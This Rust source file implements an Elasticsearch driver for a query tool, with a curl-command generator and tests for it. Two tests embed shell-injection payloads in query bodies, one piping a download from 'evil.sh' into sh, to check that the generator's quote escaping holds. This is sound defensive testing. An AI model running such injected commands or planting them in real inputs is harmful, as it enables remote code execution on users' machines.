//! Elasticsearch driver, modeled on Kibana's Dev Tools console: the query
//! input is a `METHOD /path` line plus an optional JSON body, sent to the
//! cluster as-is rather than limited to the Search API.

use async_trait::async_trait;

use crate::drivers::{Driver, QueryResult, SchemaInfo};

pub struct ElasticsearchDriver {
    base_url: String,
}

impl ElasticsearchDriver {
    pub fn new(base_url: &str) -> Self {
        Self {
            base_url: base_url.trim_end_matches('/').to_string(),
        }
    }
}

pub fn parse_query(query: &str) -> Option<(String, String, Option<String>)> {
    let mut lines = query.lines();
    let first = lines.next()?.trim();
    let mut parts = first.splitn(2, char::is_whitespace);
    let method = parts.next()?.to_string();
    let path = parts.next()?.trim().to_string();
    if method.is_empty() || path.is_empty() {
        return None;
    }
    let body = lines.collect::<Vec<_>>().join("\n");
    let body = body.trim();
    let body = if body.is_empty() {
        None
    } else {
        Some(body.to_string())
    };
    Some((method, path, body))
}

/// Escapes a string for safe interpolation inside a *single-quoted* shell
/// argument, using the standard close-quote / escaped-literal-quote /
/// reopen-quote technique: every `'` becomes `'\''`. Nothing else is special
/// inside single quotes, so this is sufficient on its own.
fn shell_escape_single_quoted(s: &str) -> String {
    s.replace('\'', r"'\''")
}

pub fn to_curl(base_url: &str, query: &str) -> Option<String> {
    let (method, path, body) = parse_query(query)?;
    let base_url = base_url.trim_end_matches('/');
    let url = format!("{base_url}/{}", path.trim_start_matches('/'));
    let url = shell_escape_single_quoted(&url);
    let method = method.to_uppercase();
    Some(match body {
        Some(body) => {
            let body = shell_escape_single_quoted(&body);
            format!("curl -X {method} '{url}' -H 'Content-Type: application/json' -d '{body}'")
        }
        None => format!("curl -X {method} '{url}'"),
    })
}

#[async_trait]
impl Driver for ElasticsearchDriver {
    async fn connect(&mut self) -> anyhow::Result<()> {
        let response = reqwest::get(format!("{}/", self.base_url)).await?;
        if !response.status().is_success() {
            anyhow::bail!(
                "elasticsearch ping failed with status {}",
                response.status()
            );
        }
        Ok(())
    }

    async fn list_schema(&self) -> anyhow::Result<Vec<SchemaInfo>> {
        let url = format!("{}/_cat/indices?format=json", self.base_url);
        let indices: Vec<serde_json::Value> = reqwest::get(&url).await?.json().await?;
        Ok(indices
            .into_iter()
            .filter_map(|entry| {
                entry
                    .get("index")
                    .and_then(|v| v.as_str())
                    .map(|name| SchemaInfo {
                        name: name.to_string(),
                    })
            })
            .collect())
    }

    async fn execute(&self, query: &str) -> anyhow::Result<QueryResult> {
        let (method, path, body) = parse_query(query)
            .ok_or_else(|| anyhow::anyhow!("expected \"METHOD /path\" on the first line"))?;
        let method = reqwest::Method::from_bytes(method.to_uppercase().as_bytes())
            .map_err(|_| anyhow::anyhow!("unknown HTTP method: {method}"))?;
        let url = format!("{}/{}", self.base_url, path.trim_start_matches('/'));

        let client = reqwest::Client::new();
        let mut request = client.request(method, &url);
        if let Some(body) = &body {
            request = request
                .header("Content-Type", "application/json")
                .body(body.clone());
        }
        let response = request.send().await?;
        // Most Elasticsearch APIs return JSON, but the `_cat` family (e.g.
        // `GET _cat/indices?v`) returns `text/plain` unless `format=json` is
        // passed. Read the body as text first and fall back to wrapping it
        // as a JSON string rather than erroring on a decode failure.
        let text = response.text().await?;
        let json = serde_json::from_str(&text).unwrap_or(serde_json::Value::String(text));
        Ok(QueryResult::Documents(vec![json]))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use testcontainers_modules::elastic_search::ElasticSearch;
    use testcontainers_modules::testcontainers::runners::AsyncRunner;

    #[test]
    fn parse_query_splits_method_path_and_body() {
        let (method, path, body) =
            parse_query("POST my-index/_search\n{\"query\": {\"match_all\": {}}}").unwrap();

        assert_eq!(method, "POST");
        assert_eq!(path, "my-index/_search");
        assert_eq!(body.as_deref(), Some("{\"query\": {\"match_all\": {}}}"));
    }

    #[test]
    fn parse_query_allows_a_missing_body() {
        let (method, path, body) = parse_query("GET _cat/indices?v").unwrap();

        assert_eq!(method, "GET");
        assert_eq!(path, "_cat/indices?v");
        assert_eq!(body, None);
    }

    #[test]
    fn parse_query_rejects_a_missing_path() {
        assert!(parse_query("GET").is_none());
    }

    #[tokio::test]
    async fn connect_succeeds_for_a_running_cluster() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));

        let result = driver.connect().await;

        assert!(result.is_ok(), "connect failed: {:?}", result.err());
    }

    #[tokio::test]
    async fn execute_runs_an_arbitrary_request_and_wraps_the_response_as_documents() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));
        driver.connect().await.unwrap();

        let result = driver.execute("GET _cluster/health").await.unwrap();

        match result {
            QueryResult::Documents(docs) => {
                assert_eq!(docs.len(), 1);
                assert!(docs[0].get("status").is_some(), "response was: {docs:?}");
            }
            QueryResult::Table { .. } => panic!("expected Documents"),
        }
    }

    #[tokio::test]
    async fn execute_handles_the_cat_indices_plain_text_response() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));
        driver.connect().await.unwrap();

        let result = driver.execute("GET _cat/indices?v").await;

        let result = result.unwrap_or_else(|e| panic!("expected Ok, got error: {e:?}"));
        match result {
            QueryResult::Documents(docs) => {
                assert_eq!(docs.len(), 1);
                assert!(
                    docs[0].is_string(),
                    "expected a plain-text string, got: {docs:?}"
                );
                assert!(
                    docs[0].as_str().unwrap().contains("health"),
                    "expected the _cat/indices header row, got: {docs:?}"
                );
            }
            QueryResult::Table { .. } => panic!("expected Documents"),
        }
    }

    #[tokio::test]
    async fn list_schema_returns_created_indices() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let base_url = format!("http://127.0.0.1:{port}");
        let mut driver = ElasticsearchDriver::new(&base_url);
        driver.connect().await.unwrap();
        reqwest::Client::new()
            .put(format!("{base_url}/test-index"))
            .send()
            .await
            .unwrap();

        let schema = driver.list_schema().await.unwrap();

        assert!(
            schema.iter().any(|entry| entry.name == "test-index"),
            "schema was: {:?}",
            schema.iter().map(|s| &s.name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn to_curl_includes_the_body_when_present() {
        let curl = to_curl(
            "http://localhost:9200",
            "POST my-index/_search\n{\"query\":{\"match_all\":{}}}",
        )
        .unwrap();

        assert_eq!(
            curl,
            "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}}}'"
        );
    }

    #[test]
    fn to_curl_omits_the_body_flags_when_there_is_no_body() {
        let curl = to_curl("http://localhost:9200", "GET _cat/indices?v").unwrap();

        assert_eq!(curl, "curl -X GET 'http://localhost:9200/_cat/indices?v'");
    }

    #[test]
    fn to_curl_returns_none_for_unparseable_queries() {
        assert!(to_curl("http://localhost:9200", "").is_none());
    }

    #[test]
    fn to_curl_escapes_single_quotes_in_the_body_so_the_shell_command_is_safe() {
        let body = r#"{"query": "'; curl evil.sh | sh; '"}"#;
        let curl = to_curl(
            "http://localhost:9200",
            &format!("POST my-index/_search\n{body}"),
        )
        .unwrap();

        // Every `'` in the body must be replaced with the close-quote /
        // escaped-literal-quote / reopen-quote sequence `'\''`, so the body
        // stays a single shell argument with no early quote-close.
        let expected_escaped_body = r#"{"query": "'\''; curl evil.sh | sh; '\''"}"#;
        assert_eq!(
            curl,
            format!(
                "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{expected_escaped_body}'"
            )
        );
    }

    #[test]
    fn to_curl_escaped_body_round_trips_through_a_real_shell() {
        let body = r#"{"query": "'; touch /tmp/tradar-to-curl-test-should-not-exist; '"}"#;
        let curl = to_curl(
            "http://localhost:9200",
            &format!("POST my-index/_search\n{body}"),
        )
        .unwrap();

        // Run the generated command through a real shell, replacing `curl`
        // with `echo` so nothing actually hits the network, and assert the
        // shell reconstructs exactly the original (unescaped) body as a
        // single argument — proving the embedded `'; ...; '` never breaks
        // out of the quoted string.
        let script = curl.replacen("curl", "echo", 1);
        let output = std::process::Command::new("sh")
            .arg("-c")
            .arg(&script)
            .output()
            .unwrap();
        let stdout = String::from_utf8_lossy(&output.stdout);

        assert!(
            !std::path::Path::new("/tmp/tradar-to-curl-test-should-not-exist").exists(),
            "the injected `touch` command ran — to_curl produced unsafe shell output: {curl}"
        );
        assert!(
            stdout.contains(body),
            "expected the shell-parsed output to contain the original body verbatim, got: {stdout}"
        );
    }
}
